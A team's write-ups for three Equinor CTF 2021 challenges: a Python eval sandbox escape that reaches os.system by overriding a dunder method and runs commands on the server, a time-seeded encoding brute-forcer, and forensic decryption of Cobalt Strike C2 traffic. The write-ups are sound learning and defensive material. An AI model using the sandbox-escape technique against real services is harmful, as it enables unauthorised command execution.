[{"content":"Misc üî• Kalk üî•  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.get_instructions(co): if opc.opname not in [\u0026#39;LOAD_NAME\u0026#39;, \u0026#39;LOAD_CONST\u0026#39;, \u0026#39;STORE_NAME\u0026#39;, \u0026#39;STORE_ATTR\u0026#39;, \u0026#39;RETURN_VALUE\u0026#39;]: print(\u0026#34;Bonk! \u0026gt;.\u0026lt;\u0026#34;, opc.opname) return eval(co, {}, locals) else: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;eval\u0026#34;) for opc in dis.get_instructions(co): if \u0026#39;CALL\u0026#39; in opc.opname: print(\u0026#39;No U! \u0026gt;.\u0026lt;\u0026#39;) return _ = eval(co, {}, locals | {\u0026#39;math\u0026#39;: Math(), \u0026#39;tease\u0026#39;: os.system}) locals[\u0026#39;_\u0026#39;] = _ return _ locals = {} while True: r = kalk(input(\u0026#39;\u0026gt; \u0026#39;), locals) if r is not None: print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don\u0026rsquo;t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don\u0026rsquo;t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046 \u0026gt; math {} \u0026gt; test = _ \u0026gt; test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046 \u0026gt; math.__class__ \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; \u0026gt; Math = _ \u0026gt; Math \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; Great, now we can overwrite __add__ with os.system\n\u0026gt; tease \u0026lt;built-in function system\u0026gt; \u0026gt; Math.__add__ = _ At last we can set the class of math to be our new class.\n\u0026gt; math {} \u0026gt; math = _ \u0026gt; math.__class__ = Math Now we should be able to run system commands by doing addition.\n\u0026gt; math + \u0026#34;id\u0026#34; uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0 \u0026gt; math + \u0026#34;ls\u0026#34; flag.txt kalk.py ynetd 0 \u0026gt; math + \u0026#34;cat flag.txt\u0026#34; EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\nüî• Know your encoding üî•  Author: zledge\nDescription: Help us decode some very important words! You might be awarded a flag in the end\nnc io.ept.gg 30045\n We are also provided with a file:\nfrom datetime import datetime from random import Random from time import time def chunks(lst, n): \u0026#34;\u0026#34;\u0026#34;Yield successive n-sized chunks from lst.\u0026#34;\u0026#34;\u0026#34; for i in range(0, len(lst), n): yield lst[i:i + n] ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def special_encoding(word, count): b = Random() b.seed(int(time() * 1000)) if count: a = \u0026#39;\u0026#39;.join(b.sample(ALPHABET,len(ALPHABET))) else: a = ALPHABET encoded = \u0026#39;\u0026#39; for x in chunks(\u0026#34;\u0026#34;.join([bin(int(byte)).lstrip(\u0026#39;0b\u0026#39;).zfill(8) for byte in word.encode(\u0026#34;ascii\u0026#34;)]), 24): y = list(chunks(x, 6)) for value in y: encoded += a[int(value.ljust(6, \u0026#34;0\u0026#34;), 2)] print(f\u0026#34;{datetime.fromtimestamp(int(time()))}- Decode the following: {encoded}\u0026#34;, flush=True) Upon connecting we\u0026rsquo;re greeted with this:\nSomeone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding. Are you ready? After answering we\u0026rsquo;re greeted with a challenge:\n2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm\nSo let\u0026rsquo;s analyze the code:\n chunks is explained with a docstring, so we can move on to special_encoding immediately First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( time() ) This is then multiplied with 1000 to get millisecond precision. (time()*1000) Lastly it\u0026rsquo;s fed into a random generator as a seed. based on a variable count it then either generated a random shuffled alphabet or uses the standard one Then in the following 4 lines it base64 encodes the word (more detailed explanation inside)  Firstly it generates a long bitstring and divides it up into 24 bits at a time Then it\u0026rsquo;s divided furthermore into chunks of 6 bits based on the value of these 6 bits it picks the corresponding character from the \u0026ldquo;alphabet-lookup string\u0026rdquo; a   After looping over the whole bitstring the encoded result is provided prefixed with the server\u0026rsquo;s current time.  Before I show the solution script there\u0026rsquo;s a few gotchas with this challenge that I\u0026rsquo;d like to mention first.\ncount variable As mentioned in the analysis special_encoding chooses which alphabet to use based on a count variable, however we don\u0026rsquo;t know the value of this variable and so we can\u0026rsquo;t be completely sure of which alphabet is used. We can make a educated guess and think that count is like a round counter starting at zero, meaning only the first round will be base64\nTimezones Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time from the server you\u0026rsquo;ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to the time parsed.\ntime() invoked twice So a small detail that\u0026rsquo;s worth noticing is that the time() used to seed the random generator isn\u0026rsquo;t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn\u0026rsquo;t pose any problems for me. But could become a problem if the system is already stressed.\nSo without further adieu, the solve script:\nfrom datetime import datetime from pwn import remote, log from random import Random from Crypto.Util.number import long_to_bytes from string import ascii_lowercase ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def decode(s, mapping): bs = \u0026#34;\u0026#34;.join([bin(mapping.index(c)).lstrip(\u0026#34;0b\u0026#34;).zfill(6) for c in s]) bs = bs[:(len(bs) // 8) * 8] return long_to_bytes(int(bs, 2)) def solve(base_time, chall): for drift in range(1000): tm = base_time * 1000 + drift b = Random() b.seed(tm) for mapping in [\u0026#39;\u0026#39;.join(b.sample(ALPHABET, len(ALPHABET))), ALPHABET]: bts = decode(chall, mapping) if all([chr(char) in ascii_lowercase for char in bts]): return bts else: log.error(\u0026#34;Couldn\u0026#39;t find solution\u0026#34;) r = remote(\u0026#34;io.ept.gg\u0026#34;, 30045) r.sendline(b\u0026#34;y\u0026#34;) r.recvline() r.recvline() for i in range(100): chal = r.recvline().decode() dt = datetime.fromisoformat(chal.split(\u0026#34; - \u0026#34;)[0]).strftime(\u0026#34;%s\u0026#34;) server_time = int(dt) + 3600 # adjust to the same timezone as the server ans = solve(server_time, chal.split(\u0026#34;: \u0026#34;)[1].strip()) print(ans) r.sendline(ans) assert r.recvline() == b\u0026#34;Correct!\\n\u0026#34; r.interactive() Further explanation brute force So since we know the time the random alphabet was generated we can just reproduce it locally. After we have the time (that\u0026rsquo;s corrected for the timezone) we have to do some brute force, because the time value we\u0026rsquo;re provided with is only in second resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.\ndecoding Now inside the loop we can feed these time values into the Random.seed() function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it\u0026rsquo;s corresponding position in the alphabet, then we convert that value to binary, stripping the 0b and ensuring it\u0026rsquo;s 6 chars long. After that we strip the bitstring into the nearest length that\u0026rsquo;s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we\u0026rsquo;re done.\nsubmitting So now we have a possible correct result, but since we\u0026rsquo;re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable and ASCII-lowercase, then we can be pretty certain that we\u0026rsquo;ve found the correct answer. But we won\u0026rsquo;t know for sure before the server responds with Correct!. Again if we bruteforced with a wider range for the drift we might begin to get false positives.\nFlag: EPT{kn0w-y0ur-en0ding!}\nForensics üî• Eastbound \u0026amp; Pwned üî•  Author: LOLASL\nDescription: KennyP thinks that Anti-Virus is for wussies and that his enemies can\u0026rsquo;t touch him, but we are now observing hits on a signature that could indicate the presence of Cobalt Strike on his computer.\nWe have retrieved the network traffic in question and a memory dump of the machine (Windows 10 x64 Build 19043.1237), can you figure out what the attacker has been up to?\nEastboundAndPwned.zip\n We are provided with an archive (EastboundAndPwned.zip), which contains a network capture (LA-FLAMA-BLANCA-20211025-071559.pcap) and a memory dump (LA-FLAMA-BLANCA-20211025-071559.raw).\nCobalt Strike The challenge description mentions Cobalt Strike, which is:\n [Cobalt Strike] is a commercial, full-featured, remote access tool that bills itself as \u0026ldquo;adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors\u0026rdquo;. Cobalt Strike‚Äôs interactive post-exploit capabilities cover the full range of ATT\u0026amp;CK tactics, all executed within a single, integrated system.\n Source: MITRE ATT\u0026amp;CK¬Æ\nIn short: it is a tool that is used to be able to remotely control a system. Malicious actors have used it for years to deploy ‚ÄúListeners‚Äù on victim machines. To solve this challenge we need to get a better understanding of how Cobalt Strike communicates, and how it can be configured.\nC2 Communication The art and science of detecting Cobalt Strike by Nick Navis (@nickmavis) from Cisco Talos, describes the C2 communication as such:\n Infection: The client is infected with either a staged, or a stageless payload. For a stageless payload, it will decode itself, and then load itself into memory. The configuration for the beacon is XOR encrypted but by default, use a static XOR key for each respective beacon version (3 or 4). Heartbeat: The infected host sends a heartbeat to the Cobalt Strike C2 server with basic metadata and queues up any commands (read Tasks) that were added. Tasks: Cobalt Strike uses AES-256 in CBC mode with HMAC-SHA-256 to encrypt task commands (i.e. commands sent remotely by the attacker). The AES key can be found in the encrypted metadata that is sent during a heartbeat, but it also lives shortly in memory of the infected process. Callbacks: After a task is executed, the host calls back to the C2 server with a encrypted payload containing the results of the task.  A more detailed explanation can be found on page 10 and 11 in the paper by Nick Navis.\nA diagram of the Cobalt Strike C2 communication flow. Source: NVISO Labs\nBeacon Configuration Didier Stevens has made a tool, 1768 K, which decodes and dumps the configuration of Cobalt Strike beacons. He later updated this tool (3 weeks ago at the time of writing this) with newer statistics.\nDecrypting Cobalt Strike Traffic Didier Stevens made yet another blog post, \u0026ldquo;Quickpost: Decrypting Cobalt Strike Traffic\u0026rdquo;. He made a tool (cs-extract-key.py) that looks in the dumped process memory for the unencrypted metadata that the beacon sends to the C2. Furthermore, he also made a tool (cs-parse-http-traffic.py) that can use the extracted keys to decrypt and parse the encrypted HTTP C2 communication in a PCAP file.\nSolution Our goal is \u0026ldquo;simple\u0026rdquo;, we need to decrypt the traffic between the infected host and the C2 server. From our research above we know that we have to:\n Extract and decrypt the Cobalt Strike Beacon configuration Dump the memory of the process that was infected with the payload Extract the AES and HMAC keys from the process memory Use these keys to decrypt the C2 (HTTP) communication  Extracting And Decoding Beacon Configuration Opening the PCAP in Wireshark, we can easily filter on http and find the Cobalt Strike stager shellcode request and thus the beacon in tcp.stream eq 9. We export this payload to a file (ept_beacon).\nGET /stE1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; LBBROWSER) Host: 172.16.32.2 Connection: Keep-Alive Cache-Control: no-cache HTTP/1.1 200 OK Date: Mon, 25 Oct 2021 07:12:52 GMT Content-Type: application/octet-stream Content-Length: 261191 --- snip --- We use the updated 1768 tool to extract the configuration for the C2 beacon, note the process injection configuration.\n$ python 1768.py -r ept_beacon File: ept_beacon xorkey(chain): 0xa6b02dff length: 0x03fc0089 Config found: xorkey b\u0026#39;.\u0026#39; 0x00000000 0x000057cf 0x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http 0x0002 port 0x0001 0x0002 80 0x0003 sleeptime 0x0002 0x0004 60000 0x0004 maxgetsize 0x0002 0x0004 1048576 0x0005 jitter 0x0001 0x0002 0 0x0006 maxdns 0x0001 0x0002 255 0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100baaa6b1100ef88c737a50e0f9f86279487a3a838e7e1da5fb1fb1fbcc8b2361207756fa5cfd1fd2c86dc86e32ac73055e7c6da46d13beaa3bc171892fb62e4c90206aaa9c28cb4f9aefc752c9fbc3ae723ed070b0f1dd516b9f75cd4d58a6e61784040d4147ba9fe2c84b9df49e67311dc7999c83772fccab8b7eb78af293135020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0x0008 server,get-uri 0x0003 0x0100 \u0026#39;172.16.32.2,/load\u0026#39; 0x0009 useragent 0x0003 0x0080 \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)\u0026#39; 0x000a post-uri 0x0003 0x0040 \u0026#39;/submit.php\u0026#39; 0x000b Malleable_C2_Instructions 0x0003 0x0100 \u0026#39;\\x00\\x00\\x00\\x04\u0026#39; 0x000c http_get_header 0x0003 0x0100 Cookie 0x000d http_post_header 0x0003 0x0100 \u0026amp;Content-Type: application/octet-stream id 0x000e SpawnTo 0x0003 0x0010 \u0026#39;\\x92~\\x14√≤¬ªD\\x08\\x89e\\x89\\x92\\x1f`√¥\u0026amp;n\u0026#39; 0x001d spawnto_x86 0x0003 0x0040 \u0026#39;%windir%\\\\syswow64\\\\rundll32.exe\u0026#39; 0x001e spawnto_x64 0x0003 0x0040 \u0026#39;%windir%\\\\sysnative\\\\rundll32.exe\u0026#39; 0x000f pipename 0x0003 0x0080 (NULL ...) 0x001f CryptoScheme 0x0001 0x0002 0 0x0013 DNS_Idle 0x0002 0x0004 0 0.0.0.0 0x0014 DNS_Sleep 0x0002 0x0004 0 0x001a get-verb 0x0003 0x0010 \u0026#39;GET\u0026#39; 0x001b post-verb 0x0003 0x0010 \u0026#39;POST\u0026#39; 0x001c HttpPostChunk 0x0002 0x0004 0 0x0025 license-id 0x0002 0x0004 885300606 0x0026 bStageCleanup 0x0001 0x0002 0 0x0027 bCFGCaution 0x0001 0x0002 0 0x0036 HostHeader 0x0003 0x0080 (NULL ...) 0x0032 UsesCookies 0x0001 0x0002 1 0x0023 proxy_type 0x0001 0x0002 2 IE settings 0x003a 0x0003 0x0080 \u0026#39;\\x00\\x04\u0026#39; 0x0039 0x0003 0x0080 \u0026#39;\\x00\\x04\u0026#39; 0x0037 0x0001 0x0002 0 0x0028 killdate 0x0002 0x0004 0 0x0029 textSectionEnd 0x0002 0x0004 0 0x002b process-inject-start-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002c process-inject-use-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002d process-inject-min_alloc 0x0002 0x0004 0 0x002e process-inject-transform-x86 0x0003 0x0100 (NULL ...) 0x002f process-inject-transform-x64 0x0003 0x0100 (NULL ...) 0x0035 process-inject-stub 0x0003 0x0010 \u0026#39;√íS√ìn\\x83w1\\x98√ºEh√Æ\\x90I?,\u0026#39; 0x0033 process-inject-execute 0x0003 0x0080 \u0026#39;\\x01\\x02\\x03\\x04\u0026#39; 0x0034 process-inject-allocation-method 0x0001 0x0002 0 0x0000 Guessing Cobalt Strike version: 4.2 (max 0x003a) With this we also find 3 HTTP requests that were during the communication (TCP stream 117, 121, and 131).\nWireshark filter: ip.addr == 172.16.32.2 and http.request.uri matches \u0026quot;/submit.php*\u0026quot;.\n\u0026amp; ls ./streams 117.hex 121.hex 131.hex $ cat 117.hex 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f We also find the encrypted metadata blob in a cookie sent in a /load request:\nCookie: dhJBx9uy37Z1YC4YF/ePAKIiFj9mkS7hsd0hwK3DO0vPAkwB/cziZXYPaVJiPFuJlzpLZZKM0Dbi9XwF3bHR76vyPhVKBaRN975ISSNxIjLGNvl6598X2Nop/noEA2ZIo+KWqXC6uRwIPh4EWdI4wlitNy63ye8clGZwbAZAhMY= Dump Memory Of The Infected Process We need to find the process where the beacon was injected, we know that it uses rundll32.exe to inject into a process (spawnto from the beacon configuration), we also note the process injection flag (PAGE_EXECUTE_READWRITE) .\nTo analyze the memory dump, we use the Volatility memory forensics framework. We also know from the challenge description that the provided memory dump was taken from a machine running Windows 10 x64 Build 19043.1237, the closest matching profile for this in Volatility is Win10x64_19041.\nLooking at Volatility\u0026rsquo;s Command Reference for Malware we find the malfind command, which helps find hidden or injected code/DLLs in user mode memory, based on characteristics such as VAD tag and page permissions.\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 malfind We find 2 interesting processes: smartscreen.ex Pid: 5576 and svchost.exe Pid: 3452.\nProcess: svchost.exe Pid: 3452 Address: 0x720000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x0000000000720000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720000 0000 ADD [EAX], AL 0x0000000000720002 0000 ADD [EAX], AL 0x0000000000720004 0000 ADD [EAX], AL 0x0000000000720006 0000 ADD [EAX], AL 0x0000000000720008 0000 ADD [EAX], AL 0x000000000072000a 0000 ADD [EAX], AL 0x000000000072000c 0000 ADD [EAX], AL 0x000000000072000e 0000 ADD [EAX], AL 0x0000000000720010 0000 ADD [EAX], AL 0x0000000000720012 0000 ADD [EAX], AL 0x0000000000720014 0000 ADD [EAX], AL 0x0000000000720016 0000 ADD [EAX], AL 0x0000000000720018 0000 ADD [EAX], AL 0x000000000072001a 0000 ADD [EAX], AL 0x000000000072001c 0000 ADD [EAX], AL 0x000000000072001e 0000 ADD [EAX], AL 0x0000000000720020 0000 ADD [EAX], AL 0x0000000000720022 0000 ADD [EAX], AL 0x0000000000720024 0000 ADD [EAX], AL 0x0000000000720026 0000 ADD [EAX], AL 0x0000000000720028 0000 ADD [EAX], AL 0x000000000072002a 0000 ADD [EAX], AL 0x000000000072002c 0000 ADD [EAX], AL 0x000000000072002e 0000 ADD [EAX], AL 0x0000000000720030 0000 ADD [EAX], AL 0x0000000000720032 0000 ADD [EAX], AL 0x0000000000720034 0000 ADD [EAX], AL 0x0000000000720036 0000 ADD [EAX], AL 0x0000000000720038 0000 ADD [EAX], AL 0x000000000072003a 0000 ADD [EAX], ALZ 0x000000000072003e 0000 ADD [EAX], AL Process: smartscreen.ex Pid: 5576 Address: 0x2491b920000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x000002491b920000 48 89 54 24 10 48 89 4c 24 08 4c 89 44 24 18 4c H.T$.H.L$.L.D$.L 0x000002491b920010 89 4c 24 20 48 8b 41 28 48 8b 48 08 48 8b 51 50 .L$.H.A(H.H.H.QP 0x000002491b920020 48 83 e2 f8 48 8b ca 48 b8 60 00 92 1b 49 02 00 H...H..H.`...I.. 0x000002491b920030 00 48 2b c8 48 81 f9 70 0f 00 00 76 09 48 c7 c1 .H+.H..p...v.H.. --- snip --- We note that both of them have the PAGE_EXECUTE_READWRITE set, which is what we saw in the beacon configuration, so we quickly dump the memory of these processes:\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 3452 $ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 5576 $ ls ./memdumps 3452.dmp 5576.dmp Extract Keys By using cs-extract-key.py we can easily parse these memory dumps and extract the AES keys within them (if they exist).\nThe script will not be able to find any keys if you run it as-is, Didier notes this in his post:\n This method does not always work: the metadata is overwritten after some time, so the process dump needs to be taken quickly after the beacon is started. And there are also cases were this metadata can not be found (I suspect this is version bound).\n The tools includes an options to perform a dictionary attack if you provide it a callback payload. The tool then extracts all possible AES and HMAC keys from the process dump and tries to authenticate and decrypt the callback. The callback payload can be found in TCP stream 117 from the PCAP.\nI somehow messed up this step, but my teammate, @UnblvR, managed to extract the key successfully from the svchost.exe process and decrypt the traffic:\n$ python cs-extract-key.py -c 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f ./memdumps/3452.dmp File: ./memdumps/3452.dmp AES key position: 0x0002a440 AES Key: f55fdb402eb483720fe7ca64f1a8a4cf HMAC key position: 0x0002a450 HMAC Key: ad5584fe824cad1d6b839860c88df785 Side note: My attempts resulted in an empty output, most likely due to the callback being messed up.\nDecrypt C2 Communication The final step is to use these extracted keys to decrypt the C2 communication. This is easily done by using the tool (cs-parse-http-traffic.py) we found earlier. With the Wireshark filter we created earlier we can be sure to only attempt to decrypt the encrypted payloads. After letting the script run for a bit, we finally see the flag in the last decrypted payload (Packet number: 156656).\n$ python cs-parse-http-traffic.py -k ad5584fe824cad1d6b839860c88df785:f55fdb402eb483720fe7ca64f1a8a4cf -Y \u0026#39;ip.addr == 172.16.32.2 and http.request.uri matches \u0026#34;/submit.php*\u0026#34;\u0026#39; LA-FLAMA-BLANCA-20211025-071559.pcap Packet number: 143669 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 2 Callback: 30 UNKNOWN la-flama-blanca\\kennyp Extra packet data: b\u0026#39;\u0026#39; Packet number: 156050 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 3 Callback: 30 UNKNOWN User name KennyP Full Name Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 9/29/2021 2:15:34 AM Password expires Never Password changeable 9/29/2021 2:15:34 AM Password required No User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 10/25/2021 12:12:52 AM Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None The command completed successfully. Extra packet data: b\u0026#39;\u0026#39; Packet number: 156656 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 4 Callback: 0 UNKNOWN ---------------------------------------------------------------------------------------------------- flag EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r} Modern\\ SystemShared\\ TIP\\ ---------------------------------------------------------------------------------------------------- Extra packet data: b\u0026#39;\u0026#39; Flag: EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r}\n","permalink":"https://bootplug.io/posts/ctf/equinorctf/","summary":"Misc üî• Kalk üî•  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.","title":"Equinor CTF 2021"}]